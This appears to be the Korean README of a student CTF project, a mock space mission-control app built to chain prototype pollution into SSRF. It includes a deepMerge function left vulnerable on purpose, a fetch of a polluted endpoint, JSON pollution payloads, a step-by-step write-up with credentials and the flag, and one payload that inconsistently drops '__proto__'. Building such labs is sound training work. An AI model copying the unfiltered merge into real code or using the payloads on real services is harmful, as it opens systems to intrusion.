# 🚀 ORPHEUS-7 : Space Mission Control

> **Prototype Pollution과 SSRF(Server-Side Request Forgery)를 활용한 웹해킹 CTF 문제 제작 프로젝트**

---

# 프로젝트 소개

ORPHEUS-7은 우주 관제 시스템(Mission Control System)을 배경으로 하는 웹해킹 CTF 문제이다.

플레이어는 일반 관제 요원 계정으로 로그인하여 위성 관리 시스템을 분석하고, 웹 서비스에 존재하는 취약점을 이용해 내부 관제 서버(Mission Core)에 접근한 후 비밀 위성 **ORPHEUS-7**의 정보를 획득하는 것이 목표이다.

단순한 취약점 하나를 이용하는 문제가 아니라, 실제 서비스처럼 기능을 분석하고 공격 흐름을 추론해야 하는 형태의 문제를 목표로 한다.

---

# 프로젝트 목표

* Node.js(Express)를 이용한 웹 서비스 개발
* Prototype Pollution 취약점 구현
* SSRF(Server-Side Request Forgery) 취약점 구현
* 취약점 체인(Attack Chain)을 활용한 CTF 문제 제작
* Docker 기반 문제 배포 환경 구축

---

# 시나리오

민간 우주기업 **AstraLink**는 여러 위성과 탐사선을 관리하는 **Mission Control System**을 운영하고 있다.

최근 관제망에 등록되지 않은 위성 **ORPHEUS-7**의 신호가 감지되었지만, 해당 정보는 일반 관제 요원에게 공개되지 않는다.

플레이어는 시스템을 분석하여 내부 관제 서버에 접근하고, ORPHEUS-7의 숨겨진 정보를 획득해야 한다.

---

# 주요 기능

### Public Mission Control

* 로그인
* Dashboard
* Satellite List
* Satellite Detail
* Communication Settings
* Telemetry Monitor

---

### Internal Mission Core

* Internal Status
* Mission Logs
* Secret Satellite (ORPHEUS-7)

---

# 취약점 구성

## 1. Prototype Pollution

Communication Settings 기능에서 사용자의 설정 정보를 병합하는 과정에서 Prototype Pollution이 발생한다.

`utils/merge.js`의 `deepMerge` 함수는 `__proto__` 키를 필터링하지 않고 재귀적으로 병합하기 때문에, 공격자가 `Object.prototype`을 오염시킬 수 있다.

```javascript
// utils/merge.js
function deepMerge(target, source) {
    for (const key in source) {  // __proto__ 필터링 없음
        if (typeof source[key] === "object" && source[key] !== null) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

---

## 2. SSRF

Telemetry 기능은 등록되지 않은 위성 조회 시 `Object.prototype.endpoint`에서 URL을 꺼내 서버가 직접 요청하는 구조이다.

PP로 `endpoint`를 오염시키면 서버가 내부 Mission Core로 요청을 보내게 된다.

```javascript
// routes/telemetry.js
const defaults = {};
const endpoint = defaults.endpoint; // PP로 오염된 경우 값이 주입됨

const response = await fetch(endpoint);
```

---

# 공격 흐름

```text
Login (operator/siss123)
      │
      ▼
소스코드 분석
(merge.js → PP 취약점 발견)
(telemetry.js → SSRF 연결고리 발견)
      │
      ▼
POST /settings
{"__proto__": {"endpoint": "http://mission-core:4000/internal/secret"}}
→ Object.prototype.endpoint 오염
      │
      ▼
POST /telemetry
{"satellite": "ORPHEUS-7"}
→ 서버가 Mission Core로 SSRF 요청
      │
      ▼
Internal Mission Core 접근
      │
      ▼
FLAG 🚩
```

---

# 언인텐 방어

## 문제점
기존 `admin.js`는 `req.session.user.isAdmin`으로 관리자를 체크했다.
PP로 `{"__proto__": {"isAdmin": true}}`를 오염시키면 admin 페이지에서 FLAG를 바로 획득할 수 있는 언인텐 경로가 존재했다.

## 해결
`admin` 라우터를 완전히 제거하여 언인텐 경로를 차단했다.
의도된 공격 체인(PP → SSRF)으로만 FLAG를 획득할 수 있다.

---

# Write-up

## 환경 실행

```bash
git clone https://github.com/naaaayeonn/orpheus-7.git
cd orpheus-7
docker-compose up --build
```

브라우저에서 `http://localhost:3000` 접속

---

## STEP 1 — 로그인
ID: operator
PW: siss123

---

## STEP 2 — 소스코드 분석

`utils/merge.js` — `__proto__` 필터링 없는 deepMerge 확인

`routes/settings.js` — req.body를 그대로 merge에 전달 → PP 가능

`routes/telemetry.js` — `defaults.endpoint`로 fetch() → SSRF 가능

---

## STEP 3 — Prototype Pollution

Burp Suite Repeater로 `POST /settings` 요청: 
Content-Type: application/json

{"proto": {"endpoint": "http://mission-core:4000/internal/secret"}}


---

## STEP 4 — SSRF 트리거

Burp Suite Repeater로 `POST /telemetry` 요청:
Content-Type: application/json

{"satellite": "ORPHEUS-7"}

---

## STEP 5 — FLAG 획득
FLAG{ORPHEUS_7_Y0U_R3ACH3D_THE_C0RE}

---

# 🛠️ 개발 환경

### Backend
* Node.js
* Express

### Frontend
* HTML / CSS / JavaScript
* EJS

### Deployment
* Docker / Docker Compose

### Analysis
* Burp Suite

---

# 프로젝트 구조

```text
orpheus-7/
│
├── siss-mission-control/
│   ├── app.js
│   ├── routes/
│   │   ├── auth.js
│   │   ├── dashboard.js
│   │   ├── satellite.js
│   │   ├── settings.js
│   │   └── telemetry.js
│   ├── utils/
│   │   └── merge.js
│   ├── views/
│   └── public/
│
├── mission-core/
│   └── core.js
│
├── docker-compose.yml
└── README.md
```

---

# 개발 일정

## Week 1
* 프로젝트 기획 및 UI 설계
* 로그인 / Dashboard / Satellite / Communication / Telemetry 구현

## Week 2
* Prototype Pollution 취약점 구현 (merge.js, settings.js)

## Week 3
* SSRF 취약점 구현 (telemetry.js)
* Internal Mission Core 구축
* FLAG 배치 및 난이도 조정
* 언인텐 경로(admin 라우터) 제거

## Week 4
* Docker 배포 환경 구축
* 공격 체인 테스트
* Write-up 작성

---

# 참고 자료

* PortSwigger Web Security Academy
* Dreamhack Wargame
* OWASP Top 10
* HackTricks
